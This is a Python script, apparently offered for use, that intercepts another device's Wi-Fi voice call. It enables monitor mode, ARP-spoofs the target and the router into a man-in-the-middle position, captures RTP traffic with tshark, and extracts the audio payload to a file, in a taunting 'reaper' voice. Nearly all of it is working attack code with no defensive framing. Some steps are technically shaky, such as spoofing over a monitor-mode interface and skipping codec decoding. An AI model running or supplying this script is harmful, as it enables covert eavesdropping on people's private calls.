import subprocess
import os
import time
import threading

# Config
WIFI_INTERFACE = "wlan0mon"
TARGET_IP = "192.168.1.10"  # Calling device
GATEWAY_IP = "192.168.1.1"  # Router
CAPTURE_FILE = "wifi_call.pcap"
AUDIO_FILE = "call_audio.raw"

# Step 1: Enable Monitor Mode
def setup_monitor():
    subprocess.run(["airmon-ng", "start", "wlan0"], check=True)
    print("Monitor mode on—sniffing the air.")

# Step 2: ARP Spoof
def arp_spoof():
    cmd = ["arpspoof", "-i", WIFI_INTERFACE, "-t", TARGET_IP, "-r", GATEWAY_IP]
    subprocess.Popen(cmd)
    print(f"ARP spoofing {TARGET_IP}—I’m the middleman.")

# Step 3: Capture with tshark
def capture_traffic():
    # Filter: UDP (RTP) from/to target
    filter = f"udp and (host {TARGET_IP})"
    cmd = [
        "tshark",
        "-i", WIFI_INTERFACE,
        "-f", filter,
        "-w", CAPTURE_FILE,
        "-a", "duration:300"  # 5-minute cap
    ]
    subprocess.run(cmd, check=True)
    print(f"Traffic captured to {CAPTURE_FILE}.")

# Step 4: Extract RTP Audio
def extract_audio():
    # Find RTP stream and dump payload
    cmd = [
        "tshark",
        "-r", CAPTURE_FILE,
        "-Y", "rtp",
        "-T", "fields",
        "-e", "rtp.payload",
        "> temp_payload.txt"
    ]
    os.system(" ".join(cmd))
    
    # Convert hex payload to raw audio (simplified—needs G.711 decoding IRL)
    with open("temp_payload.txt", "r") as f:
        payloads = f.read().splitlines()
    with open(AUDIO_FILE, "wb") as out:
        for line in payloads:
            if line:
                out.write(bytes.fromhex(line.replace(":", "")))
    os.remove("temp_payload.txt")
    print(f"Audio saved as {AUDIO_FILE}—listen up!")

# Step 5: The Reaper’s Strike
def call_reaper():
    print(f"Reaping Wi-Fi call from {TARGET_IP}...")
    
    setup_monitor()
    threading.Thread(target=arp_spoof, daemon=True).start()
    time.sleep(2)  # Let spoof settle
    capture_traffic()
    extract_audio()
    print("Call intercepted—cleaning up.")
    subprocess.run(["airmon-ng", "stop", WIFI_INTERFACE], check=True)

if __name__ == "__main__":
    try:
        call_reaper()
    except Exception as e:
        print(f"Plan B failed: {e}")
